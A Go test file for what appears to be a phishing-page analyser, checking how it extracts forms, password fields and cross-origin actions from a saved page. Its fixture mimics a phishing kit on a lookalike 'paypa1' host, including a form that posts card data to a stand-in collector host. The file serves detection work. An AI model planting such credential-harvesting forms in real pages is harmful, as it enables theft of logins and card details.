package report

import (
	"net/url"
	"os"
	"path/filepath"
	"testing"
)

func TestForms(t *testing.T) {
	dir := t.TempDir()
	dom := filepath.Join(dir, "dom.html")
	os.WriteFile(dom, []byte(`<html><head><base href="/kit/"></head><body>
<form id=search><input name=q></form>
<form method=POST action="post.php"><input type=email name=email><input type=PASSWORD name=pass>
  <form action="https://ignored.test/"></form><select name=c></select><input type=hidden name=t value=x></form>
<form action="https://collector.evil.test/x" method=post><input name=card><textarea name=note></textarea></form>
<form action="javascript:void(0)"><input type=password></form>
<div id=spa-login><input type=password name=p2></div>
</body></html>`), 0o600)
	final, _ := url.Parse("https://login.paypa1.test/signin")
	fs, pw := forms(dom, final)
	if pw != 3 {
		t.Errorf("password fields = %d, want 3", pw)
	}
	if len(fs) != 4 {
		t.Fatalf("forms = %d, want 4: %v", len(fs), fs)
	}
	if fs[0].GetAction() != "https://login.paypa1.test/kit/" || fs[0].GetMethod() != "get" || fs[0].GetHasPassword() {
		t.Errorf("search form = %v", fs[0])
	}
	f := fs[1]
	if f.GetAction() != "https://login.paypa1.test/kit/post.php" || f.GetMethod() != "post" || !f.GetHasPassword() || f.GetCrossOriginAction() {
		t.Errorf("login form = %v", f)
	}
	var types []string
	for _, x := range f.GetFields() {
		types = append(types, x.GetName()+":"+x.GetType())
	}
	// The nested <form> start is ignored and its </form> closes the outer form, as in browsers:
	// c and t end up outside it.
	if got := fmtList(types); got != "email:email pass:password" {
		t.Errorf("login form fields = %s", got)
	}
	if !fs[2].GetCrossOriginAction() || fs[2].GetAction() != "https://collector.evil.test/x" {
		t.Errorf("exfil form = %v", fs[2])
	}
	if fs[3].GetCrossOriginAction() {
		t.Errorf("a javascript: action isn't cross-origin: %v", fs[3])
	}
}

func TestFormsCapped(t *testing.T) {
	dir := t.TempDir()
	dom := filepath.Join(dir, "dom.html")
	b := []byte("<form>")
	for range 200 {
		b = append(b, "<input name=x>"...)
	}
	b = append(b, "</form>"...)
	for range 100 {
		b = append(b, "<form></form>"...)
	}
	os.WriteFile(dom, b, 0o600)
	fs, _ := forms(dom, nil)
	if len(fs) != maxForms || len(fs[0].GetFields()) != maxFields {
		t.Errorf("forms %d, fields %d", len(fs), len(fs[0].GetFields()))
	}
}

func fmtList(s []string) string {
	out := ""
	for i, x := range s {
		if i > 0 {
			out += " "
		}
		out += x
	}
	return out
}
